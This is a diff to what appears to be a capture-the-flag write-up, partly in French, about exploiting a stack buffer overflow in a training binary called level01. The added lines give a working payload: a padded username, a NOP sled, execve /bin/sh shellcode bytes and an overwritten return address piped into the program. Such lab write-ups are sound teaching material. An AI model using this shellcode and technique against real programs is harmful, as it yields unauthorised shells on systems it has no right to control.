@@ -37,6 +37,19 @@ Program received signal SIGSEGV, Segmentation fault.
 ```
 Thanks to the pattern generator we found an offset of 80.  
 As the program use `fgets()` function we should not be able to make a buffer overflow but `fgets()` take a max string of 100 chars wich is more than the offset of `eip`.  
+```
+On constate que le deuxieme fgets lit 100 bytes alors que le buffer n'en fait que 64, on peut donc exploiter l'overflow pour reecrire la valeur d'eip et injecter un shellcode.
+Il faut cependant faire attention a donner un username de 256 caracteres au premier fgets.
+Si le username est plus court, alors notre shellcode (situe en principe dans le password) va se faire absorber par le username.
+Si le username est plus long, il va deborder sur le password et donc decaler notre shellcode.
+
+Pour ajuster l'adresse de notre payload, on utilise ltrace qui va nous donner l'adresse du buffer dans lequel est stocke le password :
+fgets(" \220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\2201\300Ph/"..., 100, 0xf7fcfac0) = 0xffffd6bc
+
+On utilise le payload suivant :
+echo $(python -c 'print "dat_will" + "A"*247 + "\n" + "\x90" * 26 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*30 + "\xbd\xd6\xff\xff"') > /tmp/test
+(cat /tmp/test; cat -) | ./level01
+```
 
 ## Create our exploit
 *shellcode found [here](http://shell-storm.org/shellcode/files/shellcode-827.php)*  
